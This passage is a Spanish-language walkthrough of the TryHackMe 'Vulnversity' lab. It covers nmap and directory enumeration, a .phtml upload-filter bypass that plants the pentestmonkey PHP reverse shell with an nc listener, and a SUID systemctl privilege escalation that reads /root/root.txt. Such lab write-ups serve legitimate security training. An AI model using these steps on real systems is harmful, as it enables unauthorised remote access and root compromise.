puertos (65536)</td></tr><tr><td style="text-align:left">-p’port'</td><td>Escanear unos puertos en específico</td></tr><tr><td style="text-align:left">–open</td><td>Para que solo reporte los puertos abiertos</td></tr><tr><td style="text-align:left">-sS –min-rate 5000</td><td>Definir el tiempo del escaneo</td></tr><tr><td style="text-align:left">-n</td><td>Omitir resolución DNS</td></tr><tr><td style="text-align:left">-vvv</td><td>Para que vaya reportando lo que encuentre por consola</td></tr><tr><td style="text-align:left">-Pn</td><td>Skip host discovery</td></tr><tr><td style="text-align:left">-oG archivo</td><td>Para que guarde el escaneo en format grepeable en un archivo llamado archivo</td></tr><tr><td style="text-align:left">-sC</td><td>Para que realice scripts básicos de reconocimiento</td></tr><tr><td style="text-align:left">-sV</td><td>Proporciona la versión e información de los servicios que corren por los puertos</td></tr></tbody></table><h3 id="escanea-la-máquina-cuántos-puertos-están-abiertos">Escanea la máquina, ¿cuántos puertos están abiertos?<a aria-hidden="true" class="anchor" href="#escanea-la-máquina-cuántos-puertos-están-abiertos">#</a></h3><pre tabindex="0"><code>❯ nmap -p- 10.10.23.174

PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3128/tcp open  squid-http
3333/tcp open  dec-notes
</code></pre><p>Tiene un total de 6 puertos abiertos</p><h3 id="qué-versión-del-proxy-se-está-ejecutando-en-la-máquina">¿Qué versión del proxy se está ejecutando en la máquina?<a aria-hidden="true" class="anchor" href="#qué-versión-del-proxy-se-está-ejecutando-en-la-máquina">#</a></h3><pre tabindex="0"><code>❯ nmap -p21,22,139,445,3128,3333 -sV 10.10.23.174

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre><p>En el puerto 3128 se puede ver la version de la proxy <code>3.5.12</code></p><h3 id="cuántos-puertos-escaneará-nmap-si-se-usó-la-bandera--p-400">¿Cuántos puertos escaneará nmap si se usó la bandera -p-400?<a aria-hidden="true" class="anchor" href="#cuántos-puertos-escaneará-nmap-si-se-usó-la-bandera--p-400">#</a></h3><p>Como se indica en el parámetro (-p-400), Escaneara 400 puertos</p><h3 id="usando-el-indicador-nmap--n-qué-no-resolverá">Usando el indicador nmap -n, ¿qué no resolverá?<a aria-hidden="true" class="anchor" href="#usando-el-indicador-nmap--n-qué-no-resolverá">#</a></h3><p>Con él <code>-n</code> no hacer DNS</p><h3 id="cuál-es-el-sistema-operativo-más-probable-que-esté-ejecutando-esta-máquina">¿Cuál es el sistema operativo más probable que esté ejecutando esta máquina?<a aria-hidden="true" class="anchor" href="#cuál-es-el-sistema-operativo-más-probable-que-esté-ejecutando-esta-máquina">#</a></h3><pre tabindex="0"><code>❯ nmap -p21,22,139,445,3128,3333 -sV 10.10.23.174

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre><p>En el puerto 3333 indica que es un Ubuntu</p><h3 id="en-qué-puerto-se-está-ejecutando-el-servidor-web">¿En qué puerto se está ejecutando el servidor web?<a aria-hidden="true" class="anchor" href="#en-qué-puerto-se-está-ejecutando-el-servidor-web">#</a></h3><pre tabindex="0"><code>❯ nmap -p21,22,139,445,3128,3333 -sV 10.10.23.174

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre><p>El servidor web se está ejecutando por el puerto 3333</p><h2 id="localizando-subdirectorios">Localizando subdirectorios<a aria-hidden="true" class="anchor" href="#localizando-subdirectorios">#</a></h2><p>Para esta parte vamos a buscar directorios con <code>gobuster</code> y <code>wfuzz</code> usando el diccionario <code>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></p><h3 id="cuál-es-el-directorio-que-tiene-una-página-de-formulario-de-carga">¿Cuál es el directorio que tiene una página de formulario de carga?<a aria-hidden="true" class="anchor" href="#cuál-es-el-directorio-que-tiene-una-página-de-formulario-de-carga">#</a></h3><h4 id="gobuster">GoBuster<a aria-hidden="true" class="anchor" href="#gobuster">#</a></h4><p>GoBuster es una herramienta utilizada para la fuerza bruta de URI (directorios y archivos), subdominios DNS y nombres de host virtual. Para esta máquina, nos centraremos en usarla para directorios de fuerza bruta.</p><table><thead><tr><th>Parámetro</th><th>Función</th></tr></thead><tbody><tr><td>-e</td><td>Imprima las URL completas en su consola</td></tr><tr><td>-u</td><td>La URL de destino</td></tr><tr><td>-w</td><td>Ruta a tu diccionario</td></tr><tr><td>-U y -P</td><td>Nombre de usuario y contraseña para autenticación básica</td></tr><tr><td>-p’x'</td><td>Proxy a utilizar para las solicitudes</td></tr><tr><td>-c ‘http cookies’</td><td>Especifique una cookie para simular su autenticación</td></tr></tbody></table><div class="highlight"><pre class="chroma" tabindex="0"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ gobuster dir -u http://10.10.23.174:3333 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">2022/12/18 01:37:49 Starting gobuster in directory enumeration <span class="nv">mode</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">/images               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 320<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.23.174:3333/images/<span class="o">]</span>
</span></span><span class="line"><span class="cl">/css                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 317<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.23.174:3333/css/<span class="o">]</span>
</span></span><span class="line"><span class="cl">/js                   <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 316<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.23.174:3333/js/<span class="o">]</span>
</span></span><span class="line"><span class="cl">/fonts                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 319<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.23.174:3333/fonts/<span class="o">]</span>
</span></span><span class="line"><span class="cl">/internal             <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 322<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.23.174:3333/internal/<span class="o">]</span>
</span></span></code></pre></div><p>Probando desde un navegador los directorios que reporto, el directorio en el que se pueden subir archivos es: <code>internal</code></p><h4 id="wfuzz">wfuzz<a aria-hidden="true" class="anchor" href="#wfuzz">#</a></h4><p>Wfuzz fue creado para facilitar la tarea en las evaluaciones contra aplicaciones web, y está basado en un concepto simple; reemplaza cualquier referencia a la palabra clave FUZZ, por el valor del payload (carga útil) definido.</p><p>Un payload en Wfuzz es una fuente de datos.</p><p>Este concepto simple permite cualquier entrada sea inyectada en cualquier campo de una petición HTTP, permitiendo realizar ataques complejos de seguridad web en diferentes componentes de la aplicación web, como parámetros, formularios, directorios/archivos, cabeceras, etc.</p><p><a href="https://www.reydes.com/d/?q=Fuerza_Bruta_contra_Directorios_utilizando_Wfuzz">Fuente</a></p><table><thead><tr><th>Parámetro</th><th>Función</th></tr></thead><tbody><tr><td>-c</td><td>Para que lo reporte todo con colores</td></tr><tr><td>-t</td><td>Para configurar el tiempo</td></tr><tr><td>–hc=404</td><td>Para que no reporte los subdirectorios que no existan</td></tr><tr><td>-w</td><td>Es donde se indica el diccionario</td></tr><tr><td>FUZZ</td><td>Se escribe donde quieres aplicar el diccionario</td></tr></tbody></table><div class="highlight"><pre class="chroma" tabindex="0"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ wfuzz -c -t <span class="m">200</span> --hc<span class="o">=</span><span class="m">404</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.23.174:3333/FUZZ
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">=====================================================================</span>
</span></span><span class="line"><span class="cl">ID           Response   Lines    Word       Chars       <span class="nv">Payload</span>                                                                                                                     
</span></span><span class="line"><span class="cl"><span class="o">=====================================================================</span>
</span></span><span class="line"><span class="cl">000000550:   <span class="m">301</span>        <span class="m">9</span> L      <span class="m">28</span> W       <span class="m">317</span> Ch      <span class="s2">"css"</span>                                                                                                                       
</span></span><span class="line"><span class="cl">000000953:   <span class="m">301</span>        <span class="m">9</span> L      <span class="m">28</span> W       <span class="m">316</span> Ch      <span class="s2">"js"</span>                                                                                                                        
</span></span><span class="line"><span class="cl">000002771:   <span class="m">301</span>        <span class="m">9</span> L      <span class="m">28</span> W       <span class="m">319</span> Ch      <span class="s2">"fonts"</span>                                                                                                                     
</span></span><span class="line"><span class="cl">000002984:   <span class="m">301</span>        <span class="m">9</span> L      <span class="m">28</span> W       <span class="m">322</span> Ch      <span class="s2">"internal"</span>
</span></span><span class="line"><span class="cl">000095524:   <span class="m">403</span>        <span class="m">11</span> L     <span class="m">32</span> W       <span class="m">302</span> Ch      <span class="s2">"server-status"</span>
</span></span></code></pre></div><p>Probando desde un navegador los directorios que reporto, el directorio en el que se pueden subir archivos es: <code>internal</code></p><h2 id="comprometer-el-servidor-web">Comprometer el servidor web<a aria-hidden="true" class="anchor" href="#comprometer-el-servidor-web">#</a></h2><h2 id="qué-tipo-de-archivo-común-que-le-gustaría-cargar-para-explotar-el-servidor-está-bloqueado-prueba-un-par-para-averiguarlo">¿Qué tipo de archivo común, que le gustaría cargar para explotar el servidor, está bloqueado? Prueba un par para averiguarlo.<a aria-hidden="true" class="anchor" href="#qué-tipo-de-archivo-común-que-le-gustaría-cargar-para-explotar-el-servidor-está-bloqueado-prueba-un-par-para-averiguarlo">#</a></h2><p>La respuesta es <code>.php</code></p><h3 id="qué-extensión-está-permitida">¿Qué extensión está permitida?<a aria-hidden="true" class="anchor" href="#qué-extensión-está-permitida">#</a></h3><p>Para identificar qué extensiones no están bloqueadas, vamos a fuzzear el formulario de carga. Para hacer esto, vamos a usar BurpSuite.</p><p>Primero vamos a capturar la petición, enviarlo al intruder y definir la extensión como una variable</p><p><img alt="" class="img-fluid lazyload blur-up" data-sizes="auto" data-srcset="/writeups/tryhackme/vulnversity/images/burp_hub9719e1196e71642980343b1fd34ebc6_46762_0ade7c48b40cd06f14ceebb96998f654.webp 480w, /writeups/tryhackme/vulnversity/images/burp_hub9719e1196e71642980343b1fd34ebc6_46762_b6d91b4b83f62d15f177802a2cbfe53d.webp 640w, /writeups/tryhackme/vulnversity/images/burp_hub9719e1196e71642980343b1fd34ebc6_46762_d4a2defce31eca364ab724855e34e8c4.webp 800w, /writeups/tryhackme/vulnversity/images/burp_hub9719e1196e71642980343b1fd34ebc6_46762_ea9a93e7a01153af008b5e4d036fdda9.webp 1024w" fetchpriority="low" height="900" id="h-rh-i-1" src="/writeups/tryhackme/vulnversity/images/burp_hub9719e1196e71642980343b1fd34ebc6_46762_33cb331aba807b7cddce752bf79e4547.webp" width="1600"/></p><p>En el apartado de payloads vamos a definir las extensiones que queremos que pruebe</p><p><img alt="" class="img-fluid lazyload blur-up" data-sizes="auto" data-srcset="/writeups/tryhackme/vulnversity/images/payloads_hu948607fb97def4fb3defed0701f7d332_18982_4f43ec1d9e379ccf73c39a27546a9870.webp 480w, /writeups/tryhackme/vulnversity/images/payloads_hu948607fb97def4fb3defed0701f7d332_18982_b8327884020dfdd8e0c3fdfc8307d1ed.webp 640w, /writeups/tryhackme/vulnversity/images/payloads_hu948607fb97def4fb3defed0701f7d332_18982_a8a913fef75a2135b4bf71c7c32c949a.webp 800w, /writeups/tryhackme/vulnversity/images/payloads_hu948607fb97def4fb3defed0701f7d332_18982_90313ea0faf410c6b18e9d5c9020b034.webp 1024w" fetchpriority="low" height="900" id="h-rh-i-2" src="/writeups/tryhackme/vulnversity/images/payloads_hu948607fb97def4fb3defed0701f7d332_18982_7d1e797edb359caa21db14e6a4eaaeea.webp" width="1600"/></p><p>Ahora ya le podemos dar a attack.</p><p><img alt="" class="img-fluid lazyload blur-up" data-sizes="auto" data-srcset="/writeups/tryhackme/vulnversity/images/atack_hud33e5c8bee9f56988b5436bc76c1184f_11430_bb74c15cafb0a24a44754ec13d961956.webp 480w, /writeups/tryhackme/vulnversity/images/atack_hud33e5c8bee9f56988b5436bc76c1184f_11430_5f68a0467ba5f1a40e3b0d0b4974c475.webp 640w, /writeups/tryhackme/vulnversity/images/atack_hud33e5c8bee9f56988b5436bc76c1184f_11430_cbd237d567a53f01943369533fd9f05a.webp 800w, /writeups/tryhackme/vulnversity/images/atack_hud33e5c8bee9f56988b5436bc76c1184f_11430_4cc2fd0424172b26b6a70eb500d2ad73.webp 1024w" fetchpriority="low" height="900" id="h-rh-i-3" src="/writeups/tryhackme/vulnversity/images/atack_hud33e5c8bee9f56988b5436bc76c1184f_11430_e9984f128a3bf20408278f955d891bc6.webp" width="1600"/></p><p>Si nos fijamos en la columna de length podemos ver que en todas sale lo mismo menos una. Eso significa que con él .phtml no nos ha devuelto el mismo mensaje, se puede suponer que lo ha aceptado</p><h3 id="cuál-es-el-nombre-del-usuario-que-administra-el-servidor-web">¿Cuál es el nombre del usuario que administra el servidor web?<a aria-hidden="true" class="anchor" href="#cuál-es-el-nombre-del-usuario-que-administra-el-servidor-web">#</a></h3><p>Viendo que podemos subir .phtml vamos a mandarle un archivo para crear una reverse shell, vamos a usar https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php de pentestmonkey</p><div class="highlight"><pre class="chroma" tabindex="0"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Nos lo pasamos a nuestra máquina</span>
</span></span><span class="line"><span class="cl">wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Le cambiamos la extensión</span>
</span></span><span class="line"><span class="cl">mv php-reverse-shell.php php-reverse-shell.phtml
</span></span></code></pre></div><p>Importante cambiar estas líneas</p><div class="highlight"><pre class="chroma" tabindex="0"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$ip</span> <span class="o">=</span> <span class="s1">'127.0.0.1'</span><span class="p">;</span>  <span class="c1">// Ip de tú máquina
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$port</span> <span class="o">=</span> <span class="mi">1234</span><span class="p">;</span>       <span class="c1">// Puerto en el que te vas a poner en escucha
</span></span></span></code></pre></div><p>Nos ponemos en escucha por el puerto 443 con netcat</p><pre tabindex="0"><code>nc -nlvp 443
</code></pre><p>Ahora ya podemos ejecutar el archivo poniendo lo siguiente en el navegador</p><p>http://10.10.23.174:3333/internal/uploads/php-reverse-shell.phtml</p><p>Antes para trabajar mejor vamos a hacer un tratamiento de la terminal con los siguientes comandos:</p><div class="highlight"><pre class="chroma" tabindex="0"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">script /dev/null -c bash
</span></span></code></pre></div><p>ctrl + z</p><div class="highlight"><pre class="chroma" tabindex="0"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
</span></span></code></pre></div><div class="highlight"><pre class="chroma" tabindex="0"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">reset
</span></span></code></pre></div><div class="highlight"><pre class="chroma" tabindex="0"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">xterm
</span></span></code></pre></div><div class="highlight"><pre class="chroma" tabindex="0"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">SHELL</span><span class="o">=</span>bash
</span></span></code></pre></div><div class="highlight"><pre class="chroma" tabindex="0"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
</span></span></code></pre></div><p>Ahora en /home/bill/user.txt ya podemos ver la flag y ya sabemos que el nombre de quien administra el servidor web es bill</p><h2 id="escalada-de-privilegios">Escalada de privilegios<a aria-hidden="true" class="anchor" href="#escalada-de-privilegios">#</a></h2><p>En Linux, SUID (establecer el ID de usuario del propietario en la ejecución) es un tipo especial de permiso de archivo otorgado a un archivo. SUID otorga permisos temporales a un usuario para ejecutar el programa/archivo con el permiso del propietario del archivo (en lugar del usuario que lo ejecuta).</p><p>Por ejemplo, el archivo binario para cambiar su contraseña tiene el bit SUID (/usr/bin/passwd). Esto se debe a que para cambiar su contraseña, deberá escribir en el archivo shadowers al que no tiene acceso, root sí, por lo que tiene privilegios de root para realizar los cambios correctos.</p><h3 id="en-el-sistema-busque-todos-los-archivos-suid-qué-archivo-se-destaca">En el sistema, busque todos los archivos SUID. ¿Qué archivo se destaca?<a aria-hidden="true" class="anchor" href="#en-el-sistema-busque-todos-los-archivos-suid-qué-archivo-se-destaca">#</a></h3><p>Con <code>find / -perm -4000 -exec ls -ldb {} \; 2&gt;/dev/null</code> podemos ver los archivos con permisos suid. La respuesta es /bin/systemctl</p><h3 id="conviértase-en-root-y-obtenga-la-última-flag-rootroottxt">Conviértase en root y obtenga la última flag (/root/root.txt)<a aria-hidden="true" class="anchor" href="#conviértase-en-root-y-obtenga-la-última-flag-rootroottxt">#</a></h3><p>Ejecutando lo siguiente y después haciendo un cat a /tmp/output podemos ver la flag</p><div class="highlight"><pre class="chroma" tabindex="0"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">TF</span><span class="o">=</span><span class="k">$(</span>mktemp<span class="k">)</span>.service
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">'[Service]
</span></span></span><span class="line"><span class="cl"><span class="s1">Type=oneshot
</span></span></span><span class="line"><span class="cl"><span class="s1">ExecStart=/bin/sh -c "cat /root/root.txt &gt; /tmp/output"
</span></span></span><span class="line"><span class="cl"><span class="s1">[Install]
</span></span></span><span class="line"><span class="cl"><span class="s1">WantedBy=multi-user.target'</span> &gt; <span class="nv">$TF</span>
</span></span><span class="line"><span class="cl">/bin/systemctl link <span class="nv">$TF</span>
</span></span><span class="line"><span class="cl">/bin/systemctl <span class="nb">enable</span> --now <span class="nv">$TF</span>
</span></span></code></pre></div><div class="highlight"><pre class="chroma" tabindex="0"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat /tmp/output
</span></span></code></pre></div><p><small>December 18, 2022 by <a class="stretched-link position-relative" href="/contributors/d3b0o/">d3b0o</a><span class="stretched-link position-relative reading-time" title="Estimated reading time"><svg class="icon icon-tabler icon-tabler-clock" fill="none" height="24" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none" stroke="none"></path><path d="M3 12a9 9 0 1018 0A9 9 0 003 12"></path><path d="M12 7v5l3 3"></path></svg>7 minutes</span></small></p><div class="page-footer-meta d-flex flex-column flex-md-row justify-content-between"></div><div class="page-nav d-flex flex-column flex-sm-row"><div class="card w-100"><div class="card-body d-flex"><div class="d-flex flex-column justify-content-center"><svg class="icon icon-tabler icon-tabler-arrow-left" fill="none" height="20" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="20" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none" stroke="none"></path><path d="M5 12h14"></path><path d="M5 12l6 6"></path><path d="M5 12l6-6"></path></svg></div><div class="d-flex flex-column"><div class="text-body-secondary">Prev</div><a class="stretched-link text-reset text-decoration-none" href="/writeups/tryhackme/agent-t/">Agent T</a></div></div></div><div class="m-2"></div><div class="card text-end w-100"><div class="card-body d-flex justify-content-end"><div class="d-flex flex-column"><div class="text-body-secondary">Next</div><a class="stretched-link text-reset text-decoration-none" href="/writeups/tryhackme/brooklyn-nine-nine/">Brooklyn Nine Nine</a></div><div class="d-flex flex-column justify-content-center"><svg class="icon icon-tabler icon-tabler-arrow-right" fill="none" height="20" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="20" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none" stroke="none"></path><path d="M5 12h14"></path><path d="M13 18l6-6"></path><path d="M13 6l6 6"></path></svg></div></div></div></div></main></div></div></div><footer class="footer text-muted"><div class="container-lg"><div class="row"><div class="col-lg-8 text-center text-lg-start"><ul class="list-inline"><li class="list-inline-item"><a class="text-muted" href="/tags/">Tags</a></li></ul></div><div class="col-lg-8 text-center text-lg-end"><ul class="list-inline"><li class="list-inline-item">Brought to you by <a class="text-muted" href="https://gethyas.com/">Hyas</a></li></ul></div></div></div></footer><script async="" integrity="sha256-HoTc2qXM72/oP22IrB5ESh8jcRHPoqepdCf3WOnCfvQ=" src="/js/app.1e84dcdaa5ccef6fe83f6d88ac1e444a1f237111cfa2a7a97427f758e9c27ef4.js"></script><script async="" integrity="sha256-eOS3qUVqJ3C9b6/7H2SIsw2xLKFXw99OieOuLiWIiK4=" src="/js/flexsearch.78e4b7a9456a2770bd6faffb1f6488b30db12ca157c3df4e89e3ae2e258888ae.js"></script><script async="" integrity="sha256-xMAj783uMI5LXxEQr+HbaxZW8hfmeqfv5U4vS/L+zPg=" src="/js/search-modal.c4c023efcdee308e4b5f1110afe1db6b1656f217e67aa7efe54e2f4bf2feccf8.js"></script><div class="d-inline-flex fixed-bottom-right pb-4 pe-4"><button class="btn btn-primary rounded-circle ms-auto p-2" id="toTop" type="button"><span class="visually-hidden">Top</span><svg class="icon icon-tabler icon-tabler-chevron-up" fill="none" height="24" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none" stroke="none"></path><path d="M6 15l6-6 6 6"></path></svg></button></div></body></html>